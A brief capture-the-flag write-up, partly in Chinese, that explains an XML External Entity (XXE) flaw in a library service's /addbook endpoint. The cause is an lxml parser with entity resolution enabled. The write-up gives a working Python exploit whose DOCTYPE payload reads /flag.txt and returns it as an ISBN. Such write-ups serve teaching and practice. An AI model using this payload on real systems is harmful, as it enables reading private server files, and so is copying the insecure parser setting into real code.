# 题目描述
Can you add any ISBN in the new library service?

# 知识点
XML External Entity Injection (XXE)

# 思路
使用 lxml 的 XMLParser 开启了实体解析，导致 XXE。构造带 DOCTYPE 的 XML，POST 到 /addbook 即可

# 解题步骤

/addbook 使用 lxml 的 XMLParser(no_network=False, resolve_entities=True) ， 可被 XXE 利用，把任意外部实体展开到 \<isbn\> 中，从而把服务器文件内容当作 ISBN 返回。

![image-x12094243953](./assets/image-x12094243953.png)



![image-x12090257226](./assets/image-x12090257226.png)

# EXP

```python
import requests, re, sys
TARGET = "http://ip5001/addbook"
payload = """<?xml version="1.0"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<book><title>x</title><isbn>&xxe;</isbn></book>"""

r = requests.post(TARGET, data={'xml': payload}, timeout=10)
if not r.ok:
    print("请求失败", r.status_code); sys.exit(1)
print(r.text)
```

![image-x12090730545](./assets/image-x12090730545.png)